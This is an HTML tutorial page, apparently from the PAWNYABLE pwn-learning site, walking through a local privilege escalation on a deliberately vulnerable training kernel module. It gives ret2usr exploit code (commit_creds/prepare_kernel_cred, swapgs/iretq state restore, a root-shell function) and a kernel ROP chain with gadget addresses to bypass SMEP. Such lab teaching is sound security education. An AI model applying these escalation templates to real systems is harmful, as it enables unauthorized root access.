@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//en/linux-kernel/LK01/stack_overflow.html">
+
+    <meta name="og:title" content="Holstein v1: Exploiting Stack Overflow - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Holstein v1: Exploiting Stack Overflow | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/en/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/en/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/en/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/stack_overflow">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK01/stack_overflow">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK01/stack_overflow">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Holstein v1: Exploiting Stack Overflow
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/stack_overflow">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK01/stack_overflow">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK01/stack_overflow">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="welcome-to-holstein.html">Previous</a></div>
+            <div class="pagination-index"><a href="../index.html">Contents</a></div>
+            <div class="pagination-fd"><a href="heap_overflow.html">Next</a></div>
+        </div>
+    
+    
+        <div class="column" title="Table of Contents">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-privilege-escalation-works"><span class="toc-text">How privilege escalation works</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prepare-kernel-cred-and-commit-creds"><span class="toc-text">prepare_kernel_cred and commit_creds</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swapgs-returning-to-userland"><span class="toc-text">swapgs: returning to userland</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2user-ret2usr"><span class="toc-text">ret2user (ret2usr)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kROP"><span class="toc-text">kROP</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>In the previous section we found a stack overflow in the Holstein module and confirmed that the bug gives us control of RIP. In this section we turn that primitive into local privilege escalation and learn how to bypass several common kernel mitigations.</p>
+<h2 id="How-privilege-escalation-works">How privilege escalation works</h2>
+<p>There are many ways to escalate privileges, but the most fundamental one is to use <code>commit_creds</code>. This is a very natural approach because it performs essentially the same action the kernel uses when creating a root-privileged task.</p>
+<p>One more important goal, after getting root, is returning safely to userland. Right now we are exploiting a kernel module, so our execution context is the kernel. In the end we still need to return to user space and spawn a root shell without crashing.</p>
+<p>First let’s review the theory behind those two tasks.</p>
+<h3 id="prepare-kernel-cred-and-commit-creds"><code>prepare_kernel_cred</code> and <code>commit_creds</code></h3>
+<p>Every process has credentials. In Linux these are stored in a heap-allocated structure called <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/cred.h#L110"><code>cred</code></a>. Each task is represented by a <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/sched.h#L661"><code>task_struct</code></a>, and that structure contains a pointer to its credentials.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>One of the most important functions in kernel exploitation is <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L719"><code>prepare_kernel_cred</code></a>, which allocates and initializes a new credential structure. Let’s look at the relevant part.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Takes a pointer to task_struct as its argument */</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Let’s trace the behavior of <code>prepare_kernel_cred(NULL)</code>. First, it allocates a fresh credential object:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br></pre></td></tr></table></figure>
+<p>Then, because the first argument <code>daemon</code> is <code>NULL</code>, it copies from <code>init_cred</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>
+<p>After validating <code>old</code>, the function copies the relevant members from <code>old</code> into <code>new</code>.</p>
+<p>So <code>prepare_kernel_cred(NULL)</code> gives us a credential structure based on <code>init_cred</code>. Now look at the definition of <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L41"><code>init_cred</code></a>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">	.ucounts		= &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>As you can see, <code>init_cred</code> is essentially a root credential object.</p>
+<p>So now we can create a root credential. The next step is to install it into the current process. That is what <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L449"><code>commit_creds</code></a> does:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br></pre></td></tr></table></figure>
+<p>Therefore, a classic privilege-escalation primitive is:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure>
+<p><strong>[Update: March 28, 2023]</strong><br>
+Starting from Linux 6.2, <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c#L712"><code>prepare_kernel_cred</code> no longer accepts <code>NULL</code></a>. <code>init_cred</code> still exists, so <code>commit_creds(&amp;init_cred)</code> achieves the same result.</p>
+<h3 id="swapgs-returning-to-userland"><code>swapgs</code>: returning to userland</h3>
+<p>Calling <code>prepare_kernel_cred</code> and <code>commit_creds</code> gives us root, but that is not the end. Once the ROP chain finishes, we must return to user space cleanly and spawn a shell. If we crash or terminate immediately after gaining root, the exploit is not useful.</p>
+<p>ROP works by smashing the saved stack frames and replacing them with a chain, so restoring the original execution flow sounds difficult. But in kernel exploitation the vulnerable process is our own program, so after finishing the chain we can simply restore a valid user-space stack pointer and jump to a user-space function that spawns a shell.</p>
+<p>How does the CPU move from user mode into kernel mode in the first place? Normally through a <code>syscall</code> or an interrupt. To return from kernel mode to user mode, the kernel typically uses <code>sysretq</code> or <code>iretq</code>. <code>iretq</code> is conceptually simpler, so kernel exploits usually use it. Also, before returning to user mode, we need to switch the GS segment from the kernel GS to the user GS, which is why Intel provides the <code>swapgs</code> instruction.</p>
+<p>In practice, we want to execute <code>swapgs</code> followed by <code>iretq</code>. Before calling <code>iretq</code>, we must prepare the userland return state on the stack like this:</p>
+<center>
+  <img src="img/iretq.png" alt="Stack layout for iretq" style="width:340px;">
+</center>
+<p>Besides the user-space <code>RSP</code> and <code>RIP</code>, we must also restore <code>CS</code>, <code>SS</code>, and <code>RFLAGS</code>. The target <code>RSP</code> can point anywhere valid in userland, and <code>RIP</code> can point to a shell-spawning function. The remaining registers can be taken from the original user context, so it is convenient to save them ahead of time with a helper like this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Call this while still in userland, such as at the start of <code>main</code>, and then use those saved values when you eventually execute <code>iretq</code>.</p>
+<h2 id="ret2user-ret2usr">ret2user (ret2usr)</h2>
+<p>Now let’s put the theory into practice.</p>
+<p>The most basic technique is ret2user. Because SMEP is disabled at this stage, the kernel can execute code that lives in userland memory. That means we can simply write the sequence involving <code>prepare_kernel_cred</code>, <code>commit_creds</code>, <code>swapgs</code>, and <code>iretq</code> directly in C code.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">restore_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;swapgs ;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %0, 0x20(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %1, 0x18(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %2, 0x10(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %3, 0x08(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %4, 0x00(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;iretq&quot;</span></span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;r&quot;</span>(user_ss),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rsp),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rflags),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(win))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">escalate_privilege</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = (<span class="type">void</span>*)(prepare_kernel_cred);</span><br><span class="line">  <span class="type">void</span> (*cc)(<span class="type">char</span>*) = (<span class="type">void</span>*)(commit_creds);</span><br><span class="line">  (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">  restore_state();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>These helper routines appear in many basic kernel exploits, so it is worth turning them into your own personal template. Also remember to call <code>save_state()</code> before triggering the bug.</p>
+<p>Inside <code>escalate_privilege</code> we need function pointers for <code>prepare_kernel_cred</code> and <code>commit_creds</code>. KASLR is disabled in this stage, so those addresses should be fixed. Find them and hardcode them into your exploit.</p>
+<center>
+  <img src="img/check_kallsyms.png" alt="Getting addresses from /proc/kallsyms" style="width:380px;">
+</center>
+<p>At that point all that remains is to redirect control flow to <code>escalate_privilege</code>. You could spray the pointer many times, but since we will later do ROP anyway, it is useful to determine the exact saved RIP offset. You can compute it statically in IDA, but let’s use gdb and observe the crash site directly.</p>
+<p>Looking at the place where <code>module_write</code> calls <code>_copy_from_user</code>, the relevant offset inside the module is <code>0x190</code>. Add the module base from <code>/proc/modules</code>, set a breakpoint there, and trigger a write. The destination buffer around <code>RDI + 0x400</code> looks like this:</p>
+<center>
+  <img src="img/gdb_debug_copy.png" alt="Destination buffer during _copy_from_user" style="width:580px;">
+</center>
+<p>If we continue until just before the function returns, we get:</p>
+<center>
+  <img src="img/gdb_debug_ret.png" alt="State at the end of module_write" style="width:580px;">
+</center>
+<p>At that point <code>RSP</code> points to <code>0xffffc90000413eb0</code>.</p>
+<center>
+  <img src="img/gdb_debug_ret_regs.png" alt="Registers at the end of module_write" style="width:480px;">
+</center>
+<p>So it looks like RIP becomes controllable after <code>0x408</code> bytes of filler. With that in mind, we can update the exploit like this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;escalate_privilege;</span><br><span class="line">write(fd, buf, <span class="number">0x410</span>);</span><br></pre></td></tr></table></figure>
+<p>The full exploit is available <a href="exploit/ret2usr.c">here</a>.</p>
+<p>If you stop right before the <code>ret</code> at the end of <code>module_write</code>, you can confirm that execution reaches <code>escalate_privilege</code>.</p>
+<center>
+  <img src="img/gdb_escalate_privilege.png" alt="Calling escalate_privilege via RIP control" style="width:520px;">
+</center>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="Wolf" ></div>
+  <p class="says">
+    Sometimes `nexti` does not stop at the next instruction as you expect.<br>
+    In that case, try `stepi`, or place a breakpoint slightly further ahead.
+  </p>
+</div>
+<p>If the exploit is written correctly, execution will pass through <code>prepare_kernel_cred</code> and <code>commit_creds</code>. Step into <code>restore_state</code> as well. Right before <code>iretq</code>, the stack should look like this:</p>
+<center>
+  <img src="img/gdb_rsp_before_iretq.png" alt="Stack state right before iretq" style="width:580px;">
+</center>
+<p>If <code>stepi</code> lands in <code>win</code>, the exploit has worked.</p>
+<center>
+  <img src="img/ret2usr_win.png" alt="Successfully calling win" style="width:320px;">
+</center>
+<p>Right now the shell may already be running as root, so it can be hard to tell if the escalation actually mattered. But at least we confirmed a clean return to userland. Restore the original configuration in <code>S99pawnyable</code>, run the exploit as an unprivileged user, and check again.</p>
+<center>
+  <img src="img/ret2usr_lpe.png" alt="LPE using ret2usr" style="width:400px;">
+</center>
+<p>Privilege escalation succeeded.<br>
+This chapter introduced a lot of new ideas, so it may feel heavy at first. But as you keep working through heap and race bugs, you will notice that the final privilege-escalation steps are often very similar.</p>
+<h2 id="kROP">kROP</h2>
+<p>Now enable SMEP. Add <code>smep</code> to the QEMU CPU options:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+<p>Run the ret2user exploit again in that configuration.</p>
+<center>
+  <img src="img/smep_crash.png" alt="Crash when SMEP is enabled" style="width:640px;">
+</center>
+<p>It crashes. The message says <code>unable to execute userspace code (SMEP?)</code>, which tells us the kernel can no longer execute userland code because of SMEP.</p>
+<p>This is very similar to NX/DEP in userland. The kernel may still read and write userland memory, but it can no longer execute it. So just as NX is bypassed with ROP, SMEP can be bypassed with ROP too. Kernel ROP is often called kROP.</p>
+<p>If you are already familiar with userland exploitation, translating the ret2user logic into a ROP chain should not be difficult. There is nothing especially unusual about writing the chain itself, but let’s at least walk through how to find the gadgets.</p>
+<p>First, to search for ROP gadgets in the Linux kernel, you need to extract the core ELF image <code>vmlinux</code> from <code>bzImage</code>. The kernel tree provides the official <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> script for this purpose.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
+<p>Then use your preferred gadget finder.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ropr vmlinux --noisy --nosys --nojop -R &#x27;^pop rdi.+ret;&#x27;</span><br><span class="line">...</span><br><span class="line">0xffffffff8127bbdc: pop rdi; ret;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>The addresses printed there are absolute addresses. They are computed as the kernel base when KASLR is disabled (<code>0xffffffff81000000</code>) plus a relative offset. In the example above the relative offset is <code>0x27bbdc</code>. Since KASLR is disabled here, you can use the printed addresses directly. When KASLR is enabled, you must work with relative offsets instead.</p>
+<p>The Linux kernel contains a huge amount of code compared to libc, so in practice there are usually enough gadgets to express arbitrary behavior. In this example the author used the following gadgets, but you should try building your own chain as a debugging exercise.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8127bbdc: pop rdi; ret;</span><br><span class="line">0xffffffff81c9480d: pop rcx; ret;</span><br><span class="line">0xffffffff8160c96b: mov rdi, rax; rep movsq [rdi], [rsi]; ret;</span><br><span class="line">0xffffffff8160bf7e: swapgs; ret;</span><br></pre></td></tr></table></figure>
+<p>Finally, you still need <code>iretq</code>, but most standard gadget tools do not find it, so search with <code>objdump</code> or a similar tool:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -S -M intel vmlinux | grep iretq</span><br><span class="line">ffffffff810202af:       48 cf                   iretq</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
+  <p class="says">
+    Most ROP gadget tools are not well tested on huge binaries like the kernel.<br>
+    They may skip unsupported instructions, drop prefixes, or otherwise print incorrect results.<br>
+    Also, many tools do not correctly distinguish whether a gadget lives in executable kernel memory, so be especially careful with very high addresses such as <code>0xffffffff81cXXXYYY</code>.
+  </p>
+</div>
+<p>The exact ROP style is up to you, but the author likes to write it this way because offsets do not need to be recomputed whenever gadgets are inserted or removed:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line">*chain++ = rop_pop_rdi;</span><br><span class="line">*chain++ = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>The rest of the chain follows the same idea:</p>
+<ul>
+<li>call <code>prepare_kernel_cred(0)</code></li>
+<li>move the returned pointer into <code>rdi</code></li>
+<li>call <code>commit_creds</code></li>
+<li>execute <code>swapgs</code></li>
+<li>return to userland with <code>iretq</code></li>
+</ul>
+<p>Once you are comfortable with this version, continue to the next chapter where the stack overflow disappears and heap-based bugs take over.</p>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="welcome-to-holstein.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="heap_overflow.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
